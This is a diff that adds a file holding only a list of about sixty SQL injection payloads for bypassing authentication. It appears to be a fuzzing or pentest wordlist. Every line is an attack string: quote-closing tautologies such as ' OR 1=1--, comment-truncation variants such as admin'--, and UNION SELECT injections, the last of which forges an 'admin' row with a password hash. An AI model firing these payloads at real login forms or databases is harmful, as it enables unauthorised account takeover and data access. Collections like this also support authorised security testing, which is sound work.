@@ -1,0 +1,61 @@
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+admin'--
+admin'#
+' OR 1=1--
+' OR 1=1#
+') OR ('1'='1
+') OR ('1'='1'--
+admin') OR ('1'='1'--
+' OR ''='
+1' OR '1'='1
+' OR 'x'='x
+' OR 1=1 LIMIT 1--
+admin' OR '1'='1
+' UNION SELECT 1,1,1--
+' AND 1=0 UNION SELECT 'admin','admin'--
+' OR username LIKE '%admin%'--
+'='
+'LIKE'
+'=0--+
+' OR 1=1--+
+" OR "1"="1
+" OR "1"="1"--
+" OR "1"="1"/*
+admin"--
+') OR '1'='1'--
+") OR ("1"="1
+") OR ("1"="1"--
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+'-||0'
+"-||0"
+"-"
+" "
+"&"
+"^"
+"*"
+'--
+'/*
+'#
+"--
+"/*
+"#
+or true--
+' or true--
+" or true--
+) or true--
+') or true--
+") or true--
+admin'/*
+admin"/*
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
